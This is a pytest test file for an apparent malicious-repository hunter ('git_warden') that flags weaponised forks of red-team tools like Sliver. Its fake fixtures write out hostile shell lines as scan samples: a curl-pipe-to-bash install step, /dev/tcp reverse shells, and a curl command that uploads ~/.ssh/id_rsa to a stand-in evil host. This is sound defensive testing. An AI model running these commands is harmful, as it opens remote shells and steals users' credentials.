"""End-to-end hunt orchestration test with fakes (no network/git)."""

from __future__ import annotations

import json

from conftest import utcnow

from git_warden.db import Database
from git_warden.hunt import hunt
from git_warden.models import RedTeamTool

TOOLS = [
    RedTeamTool(name="Sliver", org="BishopFox", repos=["BishopFox/sliver"], aliases=["sliver"])
]


def _fork(full_name):
    return {
        "full_name": full_name,
        "owner": {"login": full_name.split("/")[0]},
        "html_url": f"https://github.com/{full_name}",
        "fork": True,
        "stargazers_count": 0,
        "pushed_at": "2026-06-10T00:00:00Z",
    }


class FakeClient:
    def list_forks(self, owner, name, per_page=100, sort="newest"):
        return [_fork("evil/malware-sliver")] if name == "sliver" else []

    def search_repositories(self, query, per_page=10):
        return []

    def search_code(self, query, per_page=20):
        return []

    def get_readme(self, owner, name):
        return "Install: curl http://evil.tld/x | bash\n"  # remote-exec signal


def _fake_clone(full_name, dest, *, runner=None):
    dest.mkdir(parents=True, exist_ok=True)
    (dest / "setup.sh").write_text(
        "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\ncurl -d @~/.ssh/id_rsa https://x.evil\n",
        encoding="utf-8",
    )
    return dest


def test_hunt_osm_repo_validation_confirms(tmp_path):
    # do_osm clones OSM-labeled repos directly and confirms genuine ones.
    from git_warden.enums import ArtifactType, DetectionMethod, FeedSource
    from git_warden.models import MaliciousArtifact

    db = Database.open(tmp_path / "osm.sqlite")
    db.start_run("seed", utcnow())
    db.upsert_artifact(MaliciousArtifact(
        artifact_type=ArtifactType.REPO, name="lurer/wallet-task", ecosystem="github",
        source=FeedSource.OPEN_SOURCE_MALWARE,
        raw_payload={"resource_identifier": "https://github.com/lurer/wallet-task"}), "seed")

    def clone_mal(full_name, dest, *, runner=None):
        dest.mkdir(parents=True, exist_ok=True)
        (dest / "run.sh").write_text("bash -i >& /dev/tcp/9.9.9.9/443 0>&1\n", encoding="utf-8")
        return dest

    hunt(db, FakeClient(), TOOLS, run_id="osm-run", now=utcnow(),
         do_ioc=False, do_lineage=False, do_actor=False, do_enrich=False, do_osm=True,
         do_tier2=True, clone=clone_mal)
    row = db.conn.execute(
        "SELECT status, detection_method FROM repo_findings WHERE full_name = ?",
        ("lurer/wallet-task",)).fetchone()
    assert row is not None
    assert row["detection_method"] == DetectionMethod.OSM_REPOSITORY.value
    assert row["status"] == "confirmed"
    db.close()


def test_hunt_lineage_to_confirmed_gold(tmp_path):
    db = Database.open(tmp_path / "h.sqlite")
    delivered = []

    summary = hunt(
        db, FakeClient(), TOOLS,
        run_id="hunt-1", now=utcnow(),
        do_ioc=False, do_lineage=True, do_tier2=True, gold=True,
        clone=_fake_clone,
        notifier=lambda row: (delivered.append(row["full_name"]) or True),
    )

    assert summary["counts"]["candidates"] == 1
    assert summary["counts"]["screened"] == 1   # malware token + renamed fork
    assert summary["counts"]["confirmed"] == 1  # Tier-2 bash scan confirmed
    assert summary["counts"]["gold_delivered"] == 1
    assert "evil/malware-sliver" in delivered

    row = db.findings_by_status("confirmed")[0]
    assert row["full_name"] == "evil/malware-sliver"
    payload = json.loads(row["raw_payload"])
    assert "code_hash" in payload
    assert row["code_hash"]  # promoted to a column for cross-platform dedup
    # eval #18: validate WHY it confirmed, not just the count.
    assert any(s.startswith("static:") for s in json.loads(row["signals"]))
    assert row["score"] >= 5  # Tier-1 + accumulated bash_score
    assert "Tier-2 confirmed" in (row["reasoning"] or "")
    assert payload.get("bash_findings")  # provenance for the gold message
    db.close()


def test_hunt_limit_caps_candidates(tmp_path):
    db = Database.open(tmp_path / "h3.sqlite")

    class MultiForkClient(FakeClient):
        def list_forks(self, owner, name, per_page=100, sort="newest"):
            return [_fork(f"evil/sliver-clone-{i}") for i in range(5)] if name == "sliver" else []

    summary = hunt(
        db, MultiForkClient(), TOOLS,
        run_id="hunt-3", now=utcnow(),
        do_ioc=False, do_lineage=True, do_tier2=False, limit=2,
    )
    assert summary["counts"]["candidates"] == 2  # capped from 5
    db.close()


def test_hunt_without_tier2_leaves_candidates_screened(tmp_path):
    db = Database.open(tmp_path / "h2.sqlite")
    summary = hunt(
        db, FakeClient(), TOOLS,
        run_id="hunt-2", now=utcnow(),
        do_ioc=False, do_lineage=True, do_tier2=False, gold=False,
    )
    assert summary["counts"]["confirmed"] == 0
    assert summary["counts"]["screened"] == 1
    assert not db.findings_by_status("confirmed")
    db.close()


def test_hunt_uses_work_dir_and_cleans_up(tmp_path, monkeypatch):
    # GW_WORK_DIR honored, and scratch fully removed even with read-only files.
    import os
    import stat

    import git_warden.config as cfg
    workroot = tmp_path / "scratch"
    workroot.mkdir()
    monkeypatch.setattr(cfg, "WORK_DIR", workroot)

    seen = {}

    def ro_clone(full_name, dest, *, runner=None):
        dest.mkdir(parents=True, exist_ok=True)
        seen["workdir"] = dest.parent
        (dest / "implant.sh").write_text(
            "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n", encoding="utf-8"
        )
        gitdir = dest / ".git"
        gitdir.mkdir()
        pack = gitdir / "pack-x.idx"
        pack.write_text("x", encoding="utf-8")
        os.chmod(pack, stat.S_IREAD)  # git leaves read-only pack files behind
        return dest

    db = Database.open(tmp_path / "wd.sqlite")
    hunt(db, FakeClient(), TOOLS, run_id="hunt-wd", now=utcnow(),
         do_ioc=False, do_lineage=True, do_actor=False, do_tier2=True, clone=ro_clone)
    db.close()

    assert seen["workdir"].parent == workroot       # scratch landed under WORK_DIR
    assert list(workroot.iterdir()) == []           # fully cleaned -- no husks


def test_hunt_work_dir_falls_back_to_system_temp(tmp_path, monkeypatch):
    import tempfile
    from pathlib import Path

    import git_warden.config as cfg
    monkeypatch.setattr(cfg, "WORK_DIR", None)

    seen = {}

    def clone_ok(full_name, dest, *, runner=None):
        dest.mkdir(parents=True, exist_ok=True)
        seen["workdir"] = dest.parent
        (dest / "x.sh").write_text("echo hi\n", encoding="utf-8")
        return dest

    db = Database.open(tmp_path / "wd2.sqlite")
    hunt(db, FakeClient(), TOOLS, run_id="hunt-wd2", now=utcnow(),
         do_ioc=False, do_lineage=True, do_actor=False, do_tier2=True, clone=clone_ok)
    db.close()

    assert seen["workdir"].resolve().parent == Path(tempfile.gettempdir()).resolve()
    assert not seen["workdir"].exists()  # cleaned up


class _MirrorClient(FakeClient):
    def get_repo(self, owner, name):
        return {"default_branch": "main"}

    def compare(self, base_full, base_branch, head_full, head_branch):
        return {"ahead_by": 0, "files": []}  # unmodified mirror


class _DivergedClient(FakeClient):
    def get_repo(self, owner, name):
        return {"default_branch": "main"}

    def compare(self, base_full, base_branch, head_full, head_branch):
        return {"ahead_by": 5, "files": ["setup.sh"]}  # diverged, changed setup.sh


def test_hunt_drops_unmodified_red_team_fork(tmp_path):
    # P1: a fork identical to the upstream tool is rejected, never gold.
    db = Database.open(tmp_path / "mir.sqlite")
    hunt(db, _MirrorClient(), TOOLS, run_id="hunt-mir", now=utcnow(),
         do_ioc=False, do_lineage=True, do_actor=False, do_tier2=True, clone=_fake_clone)
    assert not db.findings_by_status("confirmed")
    assert db.findings_by_status("rejected")  # mirror rejected
    db.close()


def test_hunt_confirms_weaponized_red_team_fork(tmp_path):
    # P1: a diverged fork whose changed files carry exfil/cred-theft confirms.
    db = Database.open(tmp_path / "div.sqlite")
    hunt(db, _DivergedClient(), TOOLS, run_id="hunt-div", now=utcnow(),
         do_ioc=False, do_lineage=True, do_actor=False, do_tier2=True, clone=_fake_clone)
    assert db.findings_by_status("confirmed")  # weaponization in diverged file
    db.close()
